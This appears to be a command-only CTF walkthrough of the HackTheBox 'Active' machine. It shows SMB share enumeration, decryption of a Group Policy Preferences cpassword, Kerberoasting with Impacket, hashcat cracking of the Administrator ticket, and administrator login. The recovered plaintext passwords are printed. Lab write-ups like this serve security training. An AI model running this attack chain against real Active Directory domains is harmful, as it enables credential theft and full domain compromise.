---
title: "HackTheBox - Active"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

https://github.com/SecureAuthCorp/impacket

https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py

root@kali:~/active# nmap -sV -sC 10.10.10.100  
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-07 10:11 CET  
Nmap scan report for 10.10.10.100  
Host is up (0.022s latency).  
Not shown: 983 closed ports  
PORT STATE SERVICE VERSION  
53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)  
| dns-nsid:  
|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2018-12-07 09:12:05Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open tcpwrapped  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)  
3269/tcp open tcpwrapped  
49152/tcp open msrpc Microsoft Windows RPC  
49153/tcp open msrpc Microsoft Windows RPC  
49154/tcp open msrpc Microsoft Windows RPC  
49155/tcp open msrpc Microsoft Windows RPC  
49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
49158/tcp open msrpc Microsoft Windows RPC  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows  

Host script results:  
| smb2-security-mode:  
| 2.02:  
|_ Message signing enabled and required  
| smb2-time:  
| date: 2018-12-07 10:13:01  
|_ start_date: 2018-12-07 09:42:16  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 151.38 seconds

root@kali:~/active# python smbclient.py 10.10.10.100  
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation  

Type help for list of commands  
# shares  
ADMIN$  
C$  
IPC$  
NETLOGON  
Replication  
SYSVOL  
Users  
# use Replication  
# ls  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 active.htb  
# cd active.htb  
# ls  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 DfsrPrivate  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Policies  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 scripts  
# cd Policies  
# ls  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 {31B2F340-016D-11D2-945F-00C04FB984F9}  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 {6AC1786C-016F-11D2-945F-00C04fB984F9}  
# cd {31B2F340-016D-11D2-945F-00C04FB984F9}  
# ls  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..  
-rw-rw-rw- 23 Sat Jul 21 12:38:11 2018 GPT.INI  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Group Policy  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 MACHINE  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 USER  
# cd machine  
# ls  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Microsoft  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Preferences  
-rw-rw-rw- 2788 Sat Jul 21 12:38:11 2018 Registry.pol  
# cd Preferences  
# ls  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 Groups  
# cd Groups  
# ls  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 .  
drw-rw-rw- 0 Sat Jul 21 12:37:44 2018 ..  
-rw-rw-rw- 533 Sat Jul 21 12:38:11 2018 Groups.xml

# get Groups.xml  
# exit

root@kali:~/active# cat Groups.xml

<?xml version="1.0" encoding="utf-8"?>  
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB585$  
8219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires=$  
1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>  
</Groups>

root@kali:~/active# python gpprefdecrypt.py edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ  
GPPstillStandingStrong2k18  
root@kali:~/active# python smbclient.py SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100  
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

Type help for list of commands

# shares

ADMIN$  
C$  
IPC$  
NETLOGON  
Replication  
SYSVOL  
Users

# use users

# ls

drw-rw-rw- 0 Sat Jul 21 16:39:20 2018 .  
drw-rw-rw- 0 Sat Jul 21 16:39:20 2018 ..  
drw-rw-rw- 0 Mon Jul 16 12:14:21 2018 Administrator  
drw-rw-rw- 0 Mon Jul 16 23:08:56 2018 All Users  
drw-rw-rw- 0 Mon Jul 16 23:08:47 2018 Default  
drw-rw-rw- 0 Mon Jul 16 23:08:56 2018 Default User  
-rw-rw-rw- 174 Mon Jul 16 23:01:17 2018 desktop.ini  
drw-rw-rw- 0 Mon Jul 16 23:08:47 2018 Public  
drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 SVC_TGS

# cd SVC_TGS

# ls

drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 .  
drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 ..  
drw-rw-rw- 0 Sat Jul 21 17:14:20 2018 Contacts  
drw-rw-rw- 0 Sat Jul 21 17:14:42 2018 Desktop  
drw-rw-rw- 0 Sat Jul 21 17:14:28 2018 Downloads  
drw-rw-rw- 0 Sat Jul 21 17:14:50 2018 Favorites  
drw-rw-rw- 0 Sat Jul 21 17:15:00 2018 Links  
drw-rw-rw- 0 Sat Jul 21 17:15:23 2018 My Documents  
drw-rw-rw- 0 Sat Jul 21 17:15:40 2018 My Music  
drw-rw-rw- 0 Sat Jul 21 17:15:50 2018 My Pictures  
drw-rw-rw- 0 Sat Jul 21 17:16:05 2018 My Videos  
drw-rw-rw- 0 Sat Jul 21 17:16:20 2018 Saved Games  
drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 Searches

# cd Desktop

# ls

drw-rw-rw- 0 Sat Jul 21 17:14:42 2018 .  
drw-rw-rw- 0 Sat Jul 21 17:14:42 2018 ..  
-rw-rw-rw- 34 Sat Jul 21 17:14:42 2018 user.txt

# get user.txt

# exit

root@kali:~/active# cat user.txt  
86d#########ZENSIERT#########983

root@kali:~/active# python GetUserSPNs.py -dc-ip 10.10.10.100 -request active.htb/SVC_TGS:GPPstillStandingStrong2k18  
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

ServicePrincipalName Name MemberOf PasswordLastSet LastLogon  
-------------------- ------------- -------------------------------------------------------- ------------------- -------------------  
active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 21:06:40 2018-07-30 19:17:40

$krb5tgs$23$_Administrator$ACTIVE.HTB$active/CIFS~445_$10589d87c1a98b404545a09ac0edbec8$9470373fe8ddd05e0cb35e6307ce19f2b782e291b568af5f62b6096dfb46dee03cd8add92816c256b21fc8c475acdf49e825e2f32a361bd4b94b9d56eb7  
de54b8a728752c6f7e50ceb6024d388b4ba99ba4a02dd3975355f49f9184f1e6b7606f5554d5e45d28693a5aef90f0591d36567d0e8c641e16e7c8d05047b2d9d2040e5be0a37abcb7e0e106f0a98f5861f000506daef442270dba05d0a0b593a86cd2cfb231ed9a623  
da2ec87bfd185a90c79baf2d05b9f6a0edd79c9a25a2087f22211dc99749099ac091fceab6647e6da19164dba1bd174df0bb0e3f82ba790f840b7b0d19fbc8d4e21077b9f7dc45cfc9e54ce9b788293c6d222504fdc995923ad940bdfc80da606708f0485b448a9e689  
d165f07b1d5da0f249c5db85d98d54be7d3a985808cfee3bbeb3f875eb33e6b818ed5d2f699960280092ebf9506d0510bb3f23fd1d94ce0ee3cbd3066240ddeda67986a5b70334baea5dbd88743fb3ef843ea170ecd38469a5fa1dc957566579ea25ec3c81f0e8dbaa6  
8e0c203409ebedd098cc928cab4632c401d7c5a64cc997ed3ec6e87b37b44d5dc349c25edf41623df54cde4cc356fe1023ac62684a9278bf0756d46634eb1a0379d614dd78488293b8e7a7e770ac078afdc6b60f0edd4c336557a6791c398126c61c9e546894e29d5d7  
ae3111e13fbdd4c7b68be0d7e71520d3f7f1ec6826fe24683a7c9c32a16c28221ebd8b4fe61a189cfce3d2115d9840aa9e3d77a46077d05a6cca034a81117f1240fc21c9ccaba16c5bed6815a8338b75dc293b193f45b8354e0f5aa2acad7c1606bd5d30651e9661663  
211b1e11c07073c9d932e157073fd8940055a1fb2c03260af72a521c9f633412b3d1bf9e9e21b755a92d812a1e6061dff7c0564286a0c897e6be885a8fdb8b48c6314ed2d118d504675b9935f65eafecd69f57894fdee85a32950f9ef8f21c5f6010019837d1fa1cd68  
8161cf02a9e6eb47041a83258353fb2fdd434a20de6362cb17f42b44b53f4f7b6ecd83d1b4c23698562a1ebe5b306bc6154aaaf3668738fb72078e90ad4ce5c72cd6f92df6d6747d6fcd7d23b9616a9fdbdd4312a25960102dc9b6985128e77fc7b6227bf27248efe90  
f6637e0b98bb4a72e6e452b80931649dec99bf2e8fa3c418889a6d83576110f1ad655f3e67c798b724e7b8ae1512b32ab4dbb5e46f1fd278124ba952467ec27014f0ea8e88346db8949b6c606fc9d7081ad03b85d7fa15b96a60  
root@kali:~/active# echo '$krb5tgs$23$_Administrator$ACTIVE.HTB$active/CIFS~445_$10589d87c1a98b404545a09ac0edbec8$9470373fe8ddd05e0cb35e6307ce19f2b782e291b568af5f62b6096dfb46dee03cd8add92816c256b21fc8c475acdf49e  
825e2f32a361bd4b94b9d56eb7de54b8a728752c6f7e50ceb6024d388b4ba99ba4a02dd3975355f49f9184f1e6b7606f5554d5e45d28693a5aef90f0591d36567d0e8c641e16e7c8d05047b2d9d2040e5be0a37abcb7e0e106f0a98f5861f000506daef442270dba05d  
0a0b593a86cd2cfb231ed9a623da2ec87bfd185a90c79baf2d05b9f6a0edd79c9a25a2087f22211dc99749099ac091fceab6647e6da19164dba1bd174df0bb0e3f82ba790f840b7b0d19fbc8d4e21077b9f7dc45cfc9e54ce9b788293c6d222504fdc995923ad940bdf  
c80da606708f0485b448a9e689d165f07b1d5da0f249c5db85d98d54be7d3a985808cfee3bbeb3f875eb33e6b818ed5d2f699960280092ebf9506d0510bb3f23fd1d94ce0ee3cbd3066240ddeda67986a5b70334baea5dbd88743fb3ef843ea170ecd38469a5fa1dc95  
7566579ea25ec3c81f0e8dbaa68e0c203409ebedd098cc928cab4632c401d7c5a64cc997ed3ec6e87b37b44d5dc349c25edf41623df54cde4cc356fe1023ac62684a9278bf0756d46634eb1a0379d614dd78488293b8e7a7e770ac078afdc6b60f0edd4c336557a6791  
c398126c61c9e546894e29d5d7ae3111e13fbdd4c7b68be0d7e71520d3f7f1ec6826fe24683a7c9c32a16c28221ebd8b4fe61a189cfce3d2115d9840aa9e3d77a46077d05a6cca034a81117f1240fc21c9ccaba16c5bed6815a8338b75dc293b193f45b8354e0f5aa2a  
cad7c1606bd5d30651e9661663211b1e11c07073c9d932e157073fd8940055a1fb2c03260af72a521c9f633412b3d1bf9e9e21b755a92d812a1e6061dff7c0564286a0c897e6be885a8fdb8b48c6314ed2d118d504675b9935f65eafecd69f57894fdee85a32950f9ef  
8f21c5f6010019837d1fa1cd688161cf02a9e6eb47041a83258353fb2fdd434a20de6362cb17f42b44b53f4f7b6ecd83d1b4c23698562a1ebe5b306bc6154aaaf3668738fb72078e90ad4ce5c72cd6f92df6d6747d6fcd7d23b9616a9fdbdd4312a25960102dc9b6985  
128e77fc7b6227bf27248efe90f6637e0b98bb4a72e6e452b80931649dec99bf2e8fa3c418889a6d83576110f1ad655f3e67c798b724e7b8ae1512b32ab4dbb5e46f1fd278124ba952467ec27014f0ea8e88346db8949b6c606fc9d7081ad03b85d7fa15b96a60' > s  
pn.txt  
root@kali:~/active# hashcat -m 13100 -a 0 spn.txt /usr/share/wordlists/rockyou.txt  
hashcat (v5.0.0) starting…

# OpenCL Platform #1: The pocl project

*   Device #1: pthread-AMD Ryzen 7 1700 Eight-Core Processor, 1024/2295 MB allocatable, 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1

Applicable optimizers:

*   Zero-Byte
*   Not-Iterated
*   Single-Hash
*   Single-Salt

Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.  
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.  
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.  
Watchdog: Temperature abort trigger disabled.

*   Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D D  
    GST_ELEM=4 -D KERN_TYPE=13100 -D _unroll'  
    Dictionary cache hit:
*   Filename..: /usr/share/wordlists/rockyou.txt
*   Passwords.: 14344385
*   Bytes…..: 139921507
*   Keyspace..: 14344385

$krb5tgs$23$_Administrator$ACTIVE.HTB$active/CIFS~445_$10589d87c1a98b404545a09ac0edbec8$9470373fe8ddd05e0cb35e6307ce19f2b782e291b568af5f62b6096dfb46dee03cd8add92816c256b21fc8c475acdf49e825e2f32a361bd4b94b9d56eb7  
de54b8a728752c6f7e50ceb6024d388b4ba99ba4a02dd3975355f49f9184f1e6b7606f5554d5e45d28693a5aef90f0591d36567d0e8c641e16e7c8d05047b2d9d2040e5be0a37abcb7e0e106f0a98f5861f000506daef442270dba05d0a0b593a86cd2cfb231ed9a623  
da2ec87bfd185a90c79baf2d05b9f6a0edd79c9a25a2087f22211dc99749099ac091fceab6647e6da19164dba1bd174df0bb0e3f82ba790f840b7b0d19fbc8d4e21077b9f7dc45cfc9e54ce9b788293c6d222504fdc995923ad940bdfc80da606708f0485b448a9e689  
d165f07b1d5da0f249c5db85d98d54be7d3a985808cfee3bbeb3f875eb33e6b818ed5d2f699960280092ebf9506d0510bb3f23fd1d94ce0ee3cbd3066240ddeda67986a5b70334baea5dbd88743fb3ef843ea170ecd38469a5fa1dc957566579ea25ec3c81f0e8dbaa6  
8e0c203409ebedd098cc928cab4632c401d7c5a64cc997ed3ec6e87b37b44d5dc349c25edf41623df54cde4cc356fe1023ac62684a9278bf0756d46634eb1a0379d614dd78488293b8e7a7e770ac078afdc6b60f0edd4c336557a6791c398126c61c9e546894e29d5d7  
ae3111e13fbdd4c7b68be0d7e71520d3f7f1ec6826fe24683a7c9c32a16c28221ebd8b4fe61a189cfce3d2115d9840aa9e3d77a46077d05a6cca034a81117f1240fc21c9ccaba16c5bed6815a8338b75dc293b193f45b8354e0f5aa2acad7c1606bd5d30651e9661663  
211b1e11c07073c9d932e157073fd8940055a1fb2c03260af72a521c9f633412b3d1bf9e9e21b755a92d812a1e6061dff7c0564286a0c897e6be885a8fdb8b48c6314ed2d118d504675b9935f65eafecd69f57894fdee85a32950f9ef8f21c5f6010019837d1fa1cd68  
8161cf02a9e6eb47041a83258353fb2fdd434a20de6362cb17f42b44b53f4f7b6ecd83d1b4c23698562a1ebe5b306bc6154aaaf3668738fb72078e90ad4ce5c72cd6f92df6d6747d6fcd7d23b9616a9fdbdd4312a25960102dc9b6985128e77fc7b6227bf27248efe90  
f6637e0b98bb4a72e6e452b80931649dec99bf2e8fa3c418889a6d83576110f1ad655f3e67c798b724e7b8ae1512b32ab4dbb5e46f1fd278124ba952467ec27014f0ea8e88346db8949b6c606fc9d7081ad03b85d7fa15b96a60:Ticketmaster1968

Session……….: hashcat  
Status………..: Cracked  
Hash.Type……..: Kerberos 5 TGS-REP etype 23  
Hash.Target……: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4…b96a60  
Time.Started…..: Fri Dec 7 10:25:31 2018 (13 secs)  
Time.Estimated…: Fri Dec 7 10:25:44 2018 (0 secs)  
Guess.Base…….: File (/usr/share/wordlists/rockyou.txt)  
Guess.Queue……: 1/1 (100.00%)  
Speed.#1………: 780.3 kH/s (10.58ms) @ Accel:64 Loops:1 Thr:64 Vec:8  
Recovered……..: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts  
Progress………: 10551296/14344385 (73.56%)  
Rejected………: 0/10551296 (0.00%)  
Restore.Point….: 10534912/14344385 (73.44%)  
Restore.Sub.#1…: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidates.#1….: Tioncurtis23 -> TUGGIE

Started: Fri Dec 7 10:25:30 2018  
Stopped: Fri Dec 7 10:25:45 2018  
root@kali:~/active# python smbclient.py Administrator:Ticketmaster1968@10.10.10.100  
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

Type help for list of commands

# use Users

# ls

drw-rw-rw- 0 Sat Jul 21 16:39:20 2018 .  
drw-rw-rw- 0 Sat Jul 21 16:39:20 2018 ..  
drw-rw-rw- 0 Mon Jul 16 12:14:21 2018 Administrator  
drw-rw-rw- 0 Mon Jul 16 23:08:56 2018 All Users  
drw-rw-rw- 0 Mon Jul 16 23:08:47 2018 Default  
drw-rw-rw- 0 Mon Jul 16 23:08:56 2018 Default User  
-rw-rw-rw- 174 Mon Jul 16 23:01:17 2018 desktop.ini  
drw-rw-rw- 0 Mon Jul 16 23:08:47 2018 Public  
drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 SVC_TGS

# cd Administrator

# ls

drw-rw-rw- 0 Mon Jul 16 12:14:21 2018 .  
drw-rw-rw- 0 Mon Jul 16 12:14:21 2018 ..  
drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 AppData  
drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Application Data  
drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Contacts  
drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Cookies  
drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Desktop  
drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Documents  
drw-rw-rw- 0 Mon Jul 30 15:50:27 2018 Downloads  
drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Favorites  
drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Links  
drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Local Settings  
drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Music  
drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 My Documents  
drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 NetHood  
-rw-rw-rw- 524288 Mon Jul 30 19:21:29 2018 NTUSER.DAT  
-rw-rw-rw- 262144 Mon Jul 30 19:21:29 2018 ntuser.dat.LOG1  
-rw-rw-rw- 0 Mon Jul 16 12:14:09 2018 ntuser.dat.LOG2  
-rw-rw-rw- 65536 Mon Jul 16 12:14:15 2018 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf  
-rw-rw-rw- 524288 Mon Jul 16 12:14:15 2018 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms  
-rw-rw-rw- 524288 Mon Jul 16 12:14:15 2018 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms  
-rw-rw-rw- 20 Mon Jul 30 08:26:35 2018 ntuser.ini  
drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Pictures  
drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 PrintHood  
drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Recent  
drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Saved Games  
drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Searches  
drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 SendTo  
drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Start Menu  
drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Templates  
drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Videos

# cd Desktop

# ls

drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 .  
drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 ..  
-rw-rw-rw- 282 Mon Jul 30 15:50:10 2018 desktop.ini  
-rw-rw-rw- 34 Sat Jul 21 17:06:06 2018 root.txt

# get root.txt

# exit

root@kali:~/active# cat root.txt  
b5f#########ZENSIERT#########08b